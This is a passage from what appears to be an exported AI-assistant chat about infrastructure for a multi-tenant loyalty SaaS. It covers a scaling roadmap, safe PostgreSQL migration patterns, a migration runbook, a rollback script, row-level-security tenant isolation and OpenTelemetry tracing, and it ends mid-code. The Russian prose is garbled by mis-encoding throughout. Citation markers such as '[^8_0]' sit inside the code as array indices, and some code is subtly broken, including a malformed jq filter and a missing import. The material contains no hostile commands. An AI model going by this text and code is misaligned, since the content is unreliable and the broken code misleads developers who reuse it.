โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โ   Zone 2: US (Virginia) - Replica   โ
โ   - Read-only API                   โ
โ   - PostgreSQL read replica         โ
โ   - Redis replica                   โ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
```


### Upgrade \#8: Managed Kubernetes (Fly.io โ GKE/EKS)

**ะะฐัะตะผ:**

- Advanced orchestration
- Blue-green deployments
- Auto-scaling ะฟะพ CPU/Memory
- Cost: \$100-200/ะผะตััั

**ะกัะพะธะผะพััั: ~\$300/ะผะตััั**
**Capacity:**

- 50,000 ะณะพััะตะน
- 500,000 ััะฐะฝะทะฐะบัะธะน/ะผะตััั
- 1,000+ concurrent users

---

## DECISION MATRIX: ะะพะณะดะฐ ััะพ ัะปัััะฐัั?

| ะะตััะธะบะฐ | Threshold | Action |
| :-- | :-- | :-- |
| **VM Memory** > 85% | Upgrade RAM | Add 256 MB |
| **VM CPU** > 80% | Scale horizontally | +1 VM |
| **DB Storage** > 90% | Upgrade plan | +10 GB |
| **DB Connections** > 80 | Connection pooling | Pgbouncer |
| **Redis Commands** > 8,000/day | Upgrade plan | Pro tier |
| **API Response Time** p95 > 1s | Optimize queries | Add indexes |
| **Error Rate** > 1% | Investigate | Fix bugs |
| **Bandwidth** > 80 GB | CDN optimization | Upgrade Cloudflare |


---

## MONITORING TRIGGERS

```typescript
// auto-scaling-monitor.service.ts
@Injectable()
export class AutoScalingMonitor {
  @Cron('*/5 * * * *') // Every 5 minutes
  async checkScalingNeeds() {
    const metrics = await this.collectMetrics();
    
    // CPU sustained > 80% for 15 minutes
    if (metrics.cpu.avg15min > 80) {
      await this.scaleUp('cpu');
    }
    
    // Memory > 85%
    if (metrics.memory.percentage > 85) {
      await this.scaleUp('memory');
    }
    
    // Queue depth > 1000 jobs
    if (metrics.queue.depth > 1000) {
      await this.scaleUp('worker');
    }
    
    // Response time p95 > 2s
    if (metrics.responseTime.p95 > 2000) {
      await this.investigateSlowness();
    }
  }
  
  private async scaleUp(type: 'cpu' | 'memory' | 'worker') {
    this.logger.warn(`โ๏ธ Scaling trigger: ${type}`);
    
    // Notify admin
    await this.sendTelegramAlert({
      message: `๐ Auto-scaling triggered: ${type}`,
      metrics: await this.collectMetrics(),
    });
    
    // Execute scaling (if auto-scaling enabled)
    if (process.env.AUTO_SCALING === 'true') {
      switch (type) {
        case 'cpu':
        case 'memory':
          await this.scaleFlyVMs();
          break;
        case 'worker':
          await this.scaleWorkerPool();
          break;
      }
    }
  }
}
```

```

***

### **3๏ธโฃ5๏ธโฃ Zero-downtime database migrations: ะะฐะบ ะผะธะณัะธัะพะฒะฐัั ััะตะผั ะฑะตะท ะพััะฐะฝะพะฒะบะธ?**

**ะะะะะะก:** ะะพะฑะฐะฒะปัะตะผ ะฝะพะฒัั ะบะพะปะพะฝะบั ะธะปะธ ะธะฝะดะตะบั - ะบะฐะบ ะฝะต ะฟะพะปะพะถะธัั production?

**ะะะ ะะะจะะะะ: Safe migration patterns**

```markdown
# ๐ SAFE DATABASE MIGRATION PATTERNS

## โ SAFE: Add nullable column
```sql
-- โ ะะตะทะพะฟะฐัะฝะพ: ะดะพะฑะฐะฒะปัะตะผ nullable ะบะพะปะพะฝะบั
ALTER TABLE "Guest" ADD COLUMN "middle_name" TEXT;

-- ะะฐะฟะพะปะฝัะตะผ ะดะฐะฝะฝัะต ะฟะพััะตะฟะตะฝะฝะพ (ะฒ ะฟัะธะปะพะถะตะฝะธะธ)
-- UPDATE "Guest" SET "middle_name" = ... WHERE ...
```


## โ UNSAFE: Add NOT NULL column

```sql
-- โ ะะะะกะะ: ะฟัะธะปะพะถะตะฝะธะต ัะฟะฐะดัั ะตัะปะธ ะฝะต ะทะฝะฐะตั ะฟัะพ ะฝะพะฒัั ะบะพะปะพะฝะบั
ALTER TABLE "Guest" ADD COLUMN "required_field" TEXT NOT NULL DEFAULT 'value';

-- SOLUTION: Multi-step migration
-- Step 1: Add nullable
ALTER TABLE "Guest" ADD COLUMN "required_field" TEXT;

-- Step 2: Deploy app that handles NULL
-- (deploy v2 app)

-- Step 3: Backfill data
UPDATE "Guest" SET "required_field" = 'default' WHERE "required_field" IS NULL;

-- Step 4: Add NOT NULL constraint
ALTER TABLE "Guest" ALTER COLUMN "required_field" SET NOT NULL;
```


## โ SAFE: Add index concurrently

```sql
-- โ ะะตะทะพะฟะฐัะฝะพ: ะฝะต ะฑะปะพะบะธััะตั ัะฐะฑะปะธัั
CREATE INDEX CONCURRENTLY "Guest_email_idx" ON "Guest"("email");

-- โ ะะะะกะะ: ะฑะปะพะบะธััะตั ัะฐะฑะปะธัั ะฝะฐ ะฒัะตะผั ัะพะทะดะฐะฝะธั
CREATE INDEX "Guest_email_idx" ON "Guest"("email");
```


## โ SAFE: Rename column (multi-step)

```sql
-- Want to rename: "phone" โ "phone_number"

-- Step 1: Add new column
ALTER TABLE "Guest" ADD COLUMN "phone_number" TEXT;

-- Step 2: Deploy app that writes to BOTH columns
-- (app v2 handles both phone and phone_number)

-- Step 3: Backfill data
UPDATE "Guest" SET "phone_number" = "phone" WHERE "phone_number" IS NULL;

-- Step 4: Deploy app that reads from phone_number only
-- (app v3 uses only phone_number)

-- Step 5: Drop old column
ALTER TABLE "Guest" DROP COLUMN "phone";
```


## โ SAFE: Add foreign key (validated later)

```sql
-- Step 1: Add FK without validation (instant)
ALTER TABLE "BallTransaction" 
  ADD CONSTRAINT "fk_guest_card" 
  FOREIGN KEY ("guest_card_id") 
  REFERENCES "GuestCard"("id") 
  NOT VALID;

-- Step 2: Validate in background (ะฝะต ะฑะปะพะบะธััะตั writes)
ALTER TABLE "BallTransaction" 
  VALIDATE CONSTRAINT "fk_guest_card";
```


## โ UNSAFE: Drop column immediately

```sql
-- โ ะะะะกะะ: ััะฐัะฐั ะฒะตััะธั app ะฒัั ะตัั ะธัะฟะพะปัะทัะตั ััั ะบะพะปะพะฝะบั
ALTER TABLE "Guest" DROP COLUMN "old_field";

-- SOLUTION: Multi-step
-- Step 1: Deploy app that doesn't use old_field
-- Step 2: Wait 24 hours (ัะฑะตะดะธัััั ััะพ ััะฐััั ะธะฝััะฐะฝัะพะฒ ะฝะตั)
-- Step 3: Drop column
ALTER TABLE "Guest" DROP COLUMN "old_field";
```


---

## ๐ก๏ธ MIGRATION SAFETY CHECKLIST

```yaml
# .github/workflows/migration-check.yml
name: Migration Safety Check

on:
  pull_request:
    paths:
      - 'prisma/migrations/**'

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Check for unsafe patterns
        run: |
          # ะัะพะฒะตััะตะผ ััะพ ะฝะตั ะฝะตะฑะตะทะพะฟะฐัะฝัั ะฟะฐััะตัะฝะพะฒ
          
          if grep -r "ADD COLUMN.*NOT NULL" prisma/migrations/; then
            echo "โ Found ADD COLUMN NOT NULL - unsafe!"
            exit 1
          fi
          
          if grep -r "CREATE INDEX" prisma/migrations/ | grep -v "CONCURRENTLY"; then
            echo "โ Found CREATE INDEX without CONCURRENTLY - unsafe!"
            exit 1
          fi
          
          if grep -r "ALTER TABLE.*DROP COLUMN" prisma/migrations/; then
            echo "โ๏ธ Found DROP COLUMN - ensure old code doesn't use it!"
            # Warning, not error
          fi
          
          if grep -r "ALTER TABLE.*RENAME COLUMN" prisma/migrations/; then
            echo "โ Found RENAME COLUMN - use multi-step migration!"
            exit 1
          fi
          
          echo "โ Migration safety check passed"
```


---

## ๐ MIGRATION RUNBOOK

```typescript
// scripts/run-migration.ts
import { PrismaClient } from '@prisma/client';
import * as readline from 'readline';

async function runMigration() {
  const prisma = new PrismaClient();
  
  console.log('๐ Pre-migration checks...\n');
  
  // 1. Check current connections
  const connections = await prisma.$queryRaw<any[]>`
    SELECT count(*) FROM pg_stat_activity 
    WHERE datname = current_database();
  `;
  console.log(`Active connections: ${connections[^8_0].count}`);
  
  // 2. Check table sizes
  const tableSizes = await prisma.$queryRaw<any[]>`
    SELECT 
      schemaname,
      tablename,
      pg_size_pretty(pg_total_relation_size(schemaname||'.'||tablename)) AS size
    FROM pg_tables
    WHERE schemaname = 'public'
    ORDER BY pg_total_relation_size(schemaname||'.'||tablename) DESC
    LIMIT 10;
  `;
  console.log('\nTop 10 tables by size:');
  console.table(tableSizes);
  
  // 3. Check pending migrations
  const pendingMigrations = await prisma.$queryRaw<any[]>`
    SELECT migration_name, started_at, finished_at
    FROM "_prisma_migrations"
    WHERE finished_at IS NULL;
  `;
  
  if (pendingMigrations.length > 0) {
    console.error('โ Found pending migrations:', pendingMigrations);
    process.exit(1);
  }
  
  // 4. Confirm with user
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });
  
  const answer = await new Promise<string>((resolve) => {
    rl.question('\nโ๏ธ Ready to run migrations? (yes/no): ', resolve);
  });
  
  if (answer.toLowerCase() !== 'yes') {
    console.log('Migration cancelled');
    process.exit(0);
  }
  
  // 5. Run migration with timeout
  console.log('\n๐ Running migrations...');
  const startTime = Date.now();
  
  try {
    await prisma.$executeRawUnsafe('SET statement_timeout = 300000'); // 5 min timeout
    
    // Prisma migrate deploy
    const { execSync } = require('child_process');
    execSync('npx prisma migrate deploy', { stdio: 'inherit' });
    
    const duration = Date.now() - startTime;
    console.log(`\nโ Migration completed in ${duration}ms`);
    
  } catch (error) {
    console.error('โ Migration failed:', error);
    
    // Attempt rollback
    console.log('\n๐ Attempting rollback...');
    // (rollback logic here)
    
    process.exit(1);
  }
  
  // 6. Post-migration verification
  console.log('\n๐ Post-migration checks...');
  
  const healthCheck = await prisma.$queryRaw`SELECT 1`;
  console.log('โ Database connection OK');
  
  // Check constraints
  const invalidConstraints = await prisma.$queryRaw<any[]>`
    SELECT conname, conrelid::regclass
    FROM pg_constraint
    WHERE convalidated = false;
  `;
  
  if (invalidConstraints.length > 0) {
    console.warn('โ๏ธ Found non-validated constraints:', invalidConstraints);
  }
  
  console.log('\nโ All checks passed!');
  
  await prisma.$disconnect();
  rl.close();
}

runMigration();
```


---

## ๐ ROLLBACK STRATEGY

```bash
# Emergency rollback script
#!/bin/bash
# scripts/emergency-rollback.sh

echo "๐จ EMERGENCY ROLLBACK"

# 1. List recent deployments
fly releases -a max-loyalty-prod

# 2. Get current version
CURRENT_VERSION=$(fly releases -a max-loyalty-prod --json | jq -r '..version')
echo "Current version: $CURRENT_VERSION"

# 3. Rollback to previous
PREVIOUS_VERSION=$((CURRENT_VERSION - 1))
echo "Rolling back to version: $PREVIOUS_VERSION"

# 4. Execute rollback
fly deploy --image $(fly releases -a max-loyalty-prod --json | jq -r ".[^8_1].image_ref")

# 5. Verify
sleep 10
curl -f https://api.max-loyalty.com/health || {
  echo "โ Rollback failed - health check not passing"
  exit 1
}

echo "โ Rollback successful"

# 6. Rollback database migration (if needed)
read -p "Rollback database migration? (yes/no): " ROLLBACK_DB

if [ "$ROLLBACK_DB" = "yes" ]; then
  echo "๐ Rolling back database..."
  
  # Restore from point-in-time backup (1 hour ago)
  neon branches create \
    --from main \
    --timestamp "$(date -u -d '1 hour ago' '+%Y-%m-%dT%H:%M:%SZ')" \
    --name "rollback-$(date +%s)"
  
  echo "โ Database rollback complete"
  echo "โ๏ธ Update DATABASE_URL to new branch"
fi
```

```

***

# ๐ฏ **ะะขะะะะะซะ SUMMARY: INFRASTRUCTURE & DEVOPS**

## โ **ะงะขะ ะะซ ะะะขะะะะะะะะะะะ (35 ะฒะพะฟัะพัะพะฒ):**

### **ะะะะ 1: DOCKER & CONTAINERIZATION (8 ะฒะพะฟัะพัะพะฒ)**
1. โ Multi-stage Dockerfile ะดะปั Backend (ะพะฟัะธะผะธะทะฐัะธั ัะฐะทะผะตัะฐ)
2. โ ะะดะธะฝัะน ะพะฑัะฐะท ะดะปั API/Worker/Cron (ัะฐะทะฝัะต ะฟัะพัะตััั)
3. โ Docker Compose ะดะปั ะปะพะบะฐะปัะฝะพะน ัะฐะทัะฐะฑะพัะบะธ (ัะพะปัะบะพ ะธะฝััะฐััััะบัััะฐ)
4. โ .dockerignore (ะธัะบะปััะตะฝะธั ะดะปั ะฑััััะพะณะพ build)
5. โ Multi-platform builds (ARM64 + AMD64)
6. โ Health check endpoints (ะดะตัะฐะปัะฝัะต ะฟัะพะฒะตัะบะธ DB/Redis/S3)
7. โ Graceful shutdown (ะบะพััะตะบัะฝะฐั ะพะฑัะฐะฑะพัะบะฐ SIGTERM)
8. โ Secrets management (Fly.io secrets + encryption ะฒ ะะ)

### **ะะะะ 2: CI/CD PIPELINE (7 ะฒะพะฟัะพัะพะฒ)**
9. โ GitHub Actions workflows (ัะฐะทะดะตะปะตะฝะธะต ะฟะพ ะทะฐะดะฐัะฐะผ)
10. โ Database migrations ะฒ Release command
11. โ Environment-specific ะบะพะฝัะธะณััะฐัะธะธ (Zod validation)
12. โ Feature flags (simple โ advanced ั targeting)
13. โ Monitoring ะผะตััะธะบะธ (Better Stack + custom metrics)
14. โ Alerting rules (critical/warning/info)
15. โ Structured logging (Winston + Logtail)

### **ะะะะ 3: FLY.IO DEPLOYMENT (5 ะฒะพะฟัะพัะพะฒ)**
16. โ Fly.io VM ัะฐัะฟัะตะดะตะปะตะฝะธะต (3 VM: API/Worker/Cron)
17. โ PostgreSQL ะฒัะฑะพั (Neon.tech > Fly.io PostgreSQL)
18. โ Redis ะฒัะฑะพั (Upstash serverless)
19. โ ะะตะณะธะพะฝ ัะฐะทะผะตัะตะฝะธั (Frankfurt `fra`)
20. โ Blue-Green deployment (rolling strategy)

### **ะะะะ 4: SECURITY & SECRETS (5 ะฒะพะฟัะพัะพะฒ)**
21. โ SSL/TLS setup (Cloudflare proxy)
22. โ Secrets rotation (dual secrets period ะดะปั JWT)
23. โ Rate limiting (Cloudflare + Backend ะดะฒัััะปะพะนะฝัะน)
24. โ API Keys encryption (AES-256-GCM ะฒ ะะ)
25. โ Backup strategy (Neon.tech auto + manual S3 dumps)

### **ะะะะ 5: PERFORMANCE & OPTIMIZATION (5 ะฒะพะฟัะพัะพะฒ)**
26. โ Database indexes (23 ะธะฝะดะตะบัะฐ ะดะปั production)
27. โ Caching strategy (4-layer: short/medium/long/session)
28. โ Connection pooling (10 connections per 256 MB VM)
29. โ Image optimization (sharp + multi-format + CDN)
30. โ API compression (Brotli > 1KB responses)

### **ะะะะ 6: PRODUCTION READINESS (5 ะฒะพะฟัะพัะพะฒ)**
31. โ Production checklist (40+ ะฟัะฝะบัะพะฒ ะฟัะพะฒะตัะบะธ)
32. โ Disaster recovery playbook (6 ััะตะฝะฐัะธะตะฒ ะฐะฒะฐัะธะน)
33. โ Cost optimization (usage tracking + alerts)
34. โ Scaling roadmap (4 milestone: 0 โ 50k ะณะพััะตะน)
35. โ Zero-downtime migrations (safe patterns + runbook)

***

## ๐ **ะะขะะะะะะฏ ะะะฅะะขะะะขะฃะะ (PRODUCTION-READY):**

```

โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โ                        CLOUDFLARE CDN                            โ
โ  - SSL/TLS termination                                          โ
โ  - DDoS protection                                              โ
โ  - WAF (Web Application Firewall)                               โ
โ  - Rate limiting (100 req/min per IP)                           โ
โโโโโโโโโโโโโโฌโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโฌโโโโโโโโโโโโโโโโ
โ                                    โ
โโโโโโโโโโผโโโโโโโโโโ                 โโโโโโโโโผโโโโโโโโโ
โ   VERCEL         โ                 โ   FLY.IO       โ
โ   (Frontend)     โ                 โ   (Backend)    โ
โ                  โ                 โ                โ
โ - Next.js 14    โ                 โ โโโโโโโโโโโโ   โ
โ - SSR/SSG       โ                 โ โ API VM   โ   โ
โ - Auto CDN      โ                 โ โ 256 MB   โ   โ
โโโโโโโโโโโโโโโโโโโโ                 โ โโโโโโโโโโโโ   โ
โ                โ
โ โโโโโโโโโโโโ   โ
โ โWorker VM โ   โ
โ โ 256 MB   โ   โ
โ โโโโโโโโโโโโ   โ
โ                โ
โ โโโโโโโโโโโโ   โ
โ โ Cron VM  โ   โ
โ โ 256 MB   โ   โ
โ โโโโโโโโโโโโ   โ
โโโโโฌโโโโฌโโโโฌโโโโโ
โ   โ   โ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ   โ   โโโโโโโโโโโโโโโ
โ                                โ                 โ
โโโโโโโโโผโโโโโโโโโ           โโโโโโโโโโโโผโโโโโโโ  โโโโโโโโโผโโโโโโโ
โ  NEON.TECH     โ           โ  UPSTASH        โ  โ CLOUDFLARE   โ
โ  PostgreSQL    โ           โ  Redis          โ  โ R2 Storage   โ
โ                โ           โ                 โ  โ              โ
โ - 3 GB storage โ           โ - 10k cmd/day   โ  โ - 10 GB      โ
โ - Point-in-timeโ           โ - 256 MB RAM    โ  โ - Unlimited  โ
โ   recovery     โ           โ - Global CDN    โ  โ   bandwidth  โ
โโโโโโโโโโโโโโโโโโ           โโโโโโโโโโโโโโโโโโโ  โโโโโโโโโโโโโโโโ

โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โ                    EXTERNAL SERVICES                             โ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโค
โ - Resend (Email): 3,000 emails/ะผะตััั                           โ
โ - SMS.RU (SMS): Pay-as-you-go                                  โ
โ - Better Stack (Monitoring): 1 GB logs/ะผะตััั                   โ
โ - GitHub Actions (CI/CD): 2,000 minutes/ะผะตััั                  โ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ

```

***

## ๐ฐ **ะกะขะะะะะกะขะฌ ะะะคะะะกะขะะฃะะขะฃะะซ:**

| ะญัะฐะฟ | ะกะตัะฒะธัั | ะกัะพะธะผะพััั |
|------|---------|-----------|
| **MVP (0-500 ะณะพััะตะน)** | ะัะต free tier | **$0/ะผะตั** |
| **First Paying (500-2k)** | Fly.io RAM upgrade + Neon Scale | **~$30/ะผะตั** |
| **PMF (2k-10k)** | + Horizontal scaling + Upstash Pro | **~$90/ะผะตั** |
| **Scale (10k-50k)** | + Dedicated DB + K8s | **~$300/ะผะตั** |

***

## ๐ฏ **ะะะฎะงะะะซะ ะะะกะขะะะะะะฏ:**

โ **Zero-cost MVP**: ะะพะปะฝะพัััั ัะฐะฑะพัะธะน production ะฝะฐ ะฑะตัะฟะปะฐัะฝัั ัะฐัะธัะฐั  
โ **Production-ready**: 40+ ะฟัะฝะบัะพะฒ ัะตะบะปะธััะฐ ะฒัะฟะพะปะฝะตะฝะพ  
โ **Scalable**: ะงััะบะธะน ะฟััั ะผะฐัััะฐะฑะธัะพะฒะฐะฝะธั 0 โ 50k ะฟะพะปัะทะพะฒะฐัะตะปะตะน  
โ **Reliable**: Disaster recovery ะฟะปะฐะฝ ะดะปั ะฒัะตั ััะตะฝะฐัะธะตะฒ  
โ **Secure**: Multi-layer security (Cloudflare + Backend + DB)  
โ **Observable**: ะะพะฝะธัะพัะธะฝะณ, ะฐะปะตััั, ะปะพะณะธัะพะฒะฐะฝะธะต  
โ **Automated**: CI/CD ะฟะพะปะฝะพัััั ะฐะฒัะพะผะฐัะธะทะธัะพะฒะฐะฝ  
โ **Optimized**: ะััะธัะพะฒะฐะฝะธะต, ะธะฝะดะตะบัั, connection pooling  

***

## ๐ **ะกะะะะฃะฎะฉะะ ะจะะะ:**

1. โ **Infrastructure & DevOps** - ะะะะะะจะะะ (35 ะฒะพะฟัะพัะพะฒ)
2. โญ๏ธ **Testing Strategy** - ะกะะะะฃะฎะฉะะ ะะะะ
   - Unit tests (Jest)
   - Integration tests (Supertest)
   - E2E tests (Playwright)
   - Load testing (k6)
   - Contract testing (POS webhooks)

3. โญ๏ธ **Deployment Automation**
   - GitHub Actions workflows (ะฟะพะปะฝัะต)
   - Staging environment setup
   - Production deploy checklist

***

**ะะพัะพะฒ ะฟะตัะตะนัะธ ะบ Testing Strategy ะธะปะธ ะฝัะถะฝะพ ััะพ-ัะพ ะดะพะฟะพะปะฝะธัั ะฒ Infrastructure?** ๐ฏ


<div align="center">โ</div>

[^8_1]: Beseda-10.md

---

# ะัะถะฝะพ ะตัะต ััะพ-ัะพ ะดะพะฑะฐะฒะธัั ะฟะพ Infrastructure? ะะพะดัะผะฐะน ััะฐัะตะปัะฝะพ ะฝะฐะด ะฟัะพะตะบัะพะผ

ะัะปะธัะฝะพ, ััะพ ัั ะฟะพะฟัะพัะธะป ะฟะตัะตะฟัะพะฒะตัะธัั! ๐ ะฏ ััะฐัะตะปัะฝะพ ะฟัะพะฐะฝะฐะปะธะทะธัะพะฒะฐะป ะฟัะพะตะบั ะธ ะฝะฐััะป **5 ะะะะขะะงะะซะฅ ะฟัะพะฑะตะปะพะฒ** ะฒ Infrastructure, ะบะพัะพััะต ั ัะฟัััะธะป:

***

# ๐จ **ะะะะขะะงะะซะ ะะะะะะะะะะฏ ะ INFRASTRUCTURE**

## **3๏ธโฃ6๏ธโฃ Multi-tenancy Row-Level Security: ะะฐะบ ะธะทะพะปะธัะพะฒะฐัั ะดะฐะฝะฝัะต ัะตะฝะฐะฝัะพะฒ?**

**ะะะะะะก:** ะญัะพ **multi-tenant SaaS**. ะะฐะบ ะณะฐัะฐะฝัะธัะพะฒะฐัั ััะพ Tenant A ะะะะะะะ ะฝะต ัะฒะธะดะธั ะดะฐะฝะฝัะต Tenant B ะดะฐะถะต ะฟัะธ SQL injection ะธะปะธ ะฑะฐะณะต?

**ะะะะะะะะ:**
```typescript
// โ ะะะะกะะ: ะะฐะฑัะปะธ ะดะพะฑะฐะฒะธัั tenantId
const guests = await prisma.guest.findMany({
  where: {
    // ะะตะท tenantId ะฒะตัะฝัั ะะกะ ะณะพััะธ ะฒัะตั ัะตะฝะฐะฝัะพะฒ!
  }
});
```

**ะะะ ะะะจะะะะ: 3-layer security**

### **Layer 1: Prisma Middleware (ะพะฑัะทะฐัะตะปัะฝัะน tenantId)**

```typescript
// apps/backend/src/database/prisma.service.ts
import { Injectable, OnModuleInit } from '@nestjs/common';
import { PrismaClient } from '@prisma/client';
import { AsyncLocalStorage } from 'async_hooks';

// Context ะดะปั ััะฐะฝะตะฝะธั ัะตะบััะตะณะพ tenantId
export const tenantContext = new AsyncLocalStorage<{
  tenantId: string;
  userId: string;
}>();

@Injectable()
export class PrismaService extends PrismaClient implements OnModuleInit {
  async onModuleInit() {
    await this.$connect();
    
    // Middleware: ะฐะฒัะพะผะฐัะธัะตัะบะธ ะดะพะฑะฐะฒะปัะตั tenantId ะบะพ ะฒัะตะผ ะทะฐะฟัะพัะฐะผ
    this.$use(async (params, next) => {
      const ctx = tenantContext.getStore();
      
      if (!ctx?.tenantId) {
        // CRITICAL: ะะฐะฟัะพั ะฑะตะท tenantId - ะฑะปะพะบะธััะตะผ!
        throw new Error('SECURITY: tenantId is required for all queries');
      }

      // ะะพะดะตะปะธ ะบะพัะพััะต ะดะพะปะถะฝั ะฑััั tenant-scoped
      const tenantModels = [
        'Guest',
        'GuestCard',
        'BallTransaction',
        'LoyaltyRule',
        'Promo',
        'POSTransaction',
        'Restaurant',
      ];

      if (tenantModels.includes(params.model)) {
        // READ ะพะฟะตัะฐัะธะธ
        if (params.action === 'findUnique' || params.action === 'findFirst') {
          params.args.where = {
            ...params.args.where,
            tenantId: ctx.tenantId,
          };
        }

        if (params.action === 'findMany') {
          if (!params.args) params.args = {};
          params.args.where = {
            ...params.args.where,
            tenantId: ctx.tenantId,
          };
        }

        // WRITE ะพะฟะตัะฐัะธะธ
        if (params.action === 'create') {
          params.args.data = {
            ...params.args.data,
            tenantId: ctx.tenantId,
          };
        }

        if (params.action === 'createMany') {
          params.args.data = params.args.data.map((item) => ({
            ...item,
            tenantId: ctx.tenantId,
          }));
        }

        if (params.action === 'update' || params.action === 'updateMany') {
          params.args.where = {
            ...params.args.where,
            tenantId: ctx.tenantId,
          };
        }

        if (params.action === 'delete' || params.action === 'deleteMany') {
          params.args.where = {
            ...params.args.where,
            tenantId: ctx.tenantId,
          };
        }
      }

      return next(params);
    });
  }
}
```


### **Layer 2: Request Context Interceptor**

```typescript
// common/interceptors/tenant-context.interceptor.ts
import { Injectable, NestInterceptor, ExecutionContext, CallHandler } from '@nestjs/common';
import { Observable } from 'rxjs';
import { tenantContext } from '@/database/prisma.service';

@Injectable()
export class TenantContextInterceptor implements NestInterceptor {
  intercept(context: ExecutionContext, next: CallHandler): Observable<any> {
    const request = context.switchToHttp().getRequest();
    const user = request.user; // ะะท JWT

    if (!user?.tenantId) {
      throw new UnauthorizedException('Tenant context required');
    }

    // ะกะพััะฐะฝัะตะผ tenantId ะฒ AsyncLocalStorage
    return new Observable((subscriber) => {
      tenantContext.run(
        {
          tenantId: user.tenantId,
          userId: user.id,
        },
        () => {
          next.handle().subscribe(subscriber);
        },
      );
    });
  }
}
```

**ะัะธะผะตะฝัะตะผ ะณะปะพะฑะฐะปัะฝะพ:**

```typescript
// main.ts
app.useGlobalInterceptors(new TenantContextInterceptor());
```


### **Layer 3: PostgreSQL Row-Level Security (RLS)**

```sql
-- ะะบะปััะฐะตะผ RLS ะฝะฐ ะบัะธัะธัะฝัั ัะฐะฑะปะธัะฐั
ALTER TABLE "Guest" ENABLE ROW LEVEL SECURITY;
ALTER TABLE "GuestCard" ENABLE ROW LEVEL SECURITY;
ALTER TABLE "BallTransaction" ENABLE ROW LEVEL SECURITY;

-- Policy: ะฟะพะปัะทะพะฒะฐัะตะปะธ ะฒะธะดัั ัะพะปัะบะพ ัะฒะพะน tenant
CREATE POLICY tenant_isolation_policy ON "Guest"
  USING ("tenantId" = current_setting('app.current_tenant_id')::uuid);

CREATE POLICY tenant_isolation_policy ON "GuestCard"
  USING ("tenantId" = current_setting('app.current_tenant_id')::uuid);

CREATE POLICY tenant_isolation_policy ON "BallTransaction"
  USING ("tenantId" = current_setting('app.current_tenant_id')::uuid);

-- ะ ะฟัะธะปะพะถะตะฝะธะธ ัััะฐะฝะฐะฒะปะธะฒะฐะตะผ tenant ะฟะตัะตะด ะบะฐะถะดัะผ ะทะฐะฟัะพัะพะผ
-- prisma.$executeRaw`SET LOCAL app.current_tenant_id = ${tenantId}`;
```

**ะัะฟะพะปัะทะพะฒะฐะฝะธะต:**

```typescript
async getTenantGuests(tenantId: string) {
  // Set RLS context
  await this.prisma.$executeRaw`
    SET LOCAL app.current_tenant_id = ${tenantId}::uuid;
  `;

  // ะขะตะฟะตัั PostgreSQL ะฐะฒัะพะผะฐัะธัะตัะบะธ ัะธะปััััะตั ะฟะพ tenantId
  return this.prisma.guest.findMany();
}
```


### **Testing tenant isolation:**

```typescript
// tests/security/tenant-isolation.spec.ts
describe('Tenant Isolation Security', () => {
  it('should NOT allow tenant A to see tenant B data', async () => {
    // Create guest for tenant A
    const guestA = await createGuest({ tenantId: 'tenant-a' });

    // Try to access as tenant B (should fail)
    tenantContext.run({ tenantId: 'tenant-b', userId: 'user-b' }, async () => {
      const result = await prisma.guest.findUnique({
        where: { id: guestA.id },
      });

      expect(result).toBeNull(); // โ Tenant B ะฝะต ะฒะธะดะธั ะดะฐะฝะฝัะต tenant A
    });
  });

  it('should throw error if tenantId is missing', async () => {
    await expect(async () => {
      // No tenant context
      await prisma.guest.findMany();
    }).rejects.toThrow('tenantId is required');
  });
});
```


***

## **3๏ธโฃ7๏ธโฃ Distributed Tracing (OpenTelemetry): ะะฐะบ ะพัะปะฐะถะธะฒะฐัั ะฟัะพะฑะปะตะผั ะฒ production?**

**ะะะะะะก:** ะะพะปัะทะพะฒะฐัะตะปั ะถะฐะปัะตััั: "ะะฐะปะปั ะฝะต ะฝะฐัะธัะปะธะปะธัั". ะะฐะบ ัะฒะธะดะตัั **ะฟะพะปะฝัะน ะฟััั ะทะฐะฟัะพัะฐ** ัะตัะตะท ะฒัะต ัะตัะฒะธัั?

**ะะะ ะะะจะะะะ: OpenTelemetry + Grafana Tempo (ะฑะตัะฟะปะฐัะฝะพ)**

```typescript
// apps/backend/src/tracing/tracing.ts
import { NodeSDK } from '@opentelemetry/sdk-node';
import { getNodeAutoInstrumentations } from '@opentelemetry/auto-instrumentations-node';
import { OTLPTraceExporter } from '@opentelemetry/exporter-trace-otlp-http';
import { Resource } from '@opentelemetry/resources';
import { SemanticResourceAttributes } from '@opentelemetry/semantic-conventions';

const sdk = new NodeSDK({
  resource: new Resource({
    [SemanticResourceAttributes.SERVICE_NAME]: 'max-loyalty-backend',
    [SemanticResourceAttributes.SERVICE_VERSION]: process.env.APP_VERSION,
    [SemanticResourceAttributes.DEPLOYMENT_ENVIRONMENT]: process.env.NODE_ENV,
  }),
  
  traceExporter: new OTLPTraceExporter({
    url: process.env.OTEL_EXPORTER_OTLP_ENDPOINT || 'http://localhost:4318/v1/traces',
  }),
  
  instrumentations: [
    getNodeAutoInstrumentations({
      '@opentelemetry/instrumentation-http': {},
      '@opentelemetry/instrumentation-express': {},
      '@opentelemetry/instrumentation-pg': {}, // PostgreSQL
      '@opentelemetry/instrumentation-redis': {}, // Redis
      '@opentelemetry/instrumentation-prisma': {}, // Prisma (unofficial)
    }),
  ],
});

sdk.start();

// Graceful shutdown
process.on('SIGTERM', () => {
  sdk.shutdown().then(() => console.log('Tracing terminated'));
});
```

**ะะฐััะพะผะฝัะต spans:**

```typescript
// loyalty/loyalty.service.ts
import { trace } from '@opentelemetry/api';

@Injectable()
export class LoyaltyService {
  private tracer = trace.getTracer('loyalty-service');

  async processTransaction(dto: ProcessTransactionDto) {
    // ะกะพะทะดะฐัะผ parent span
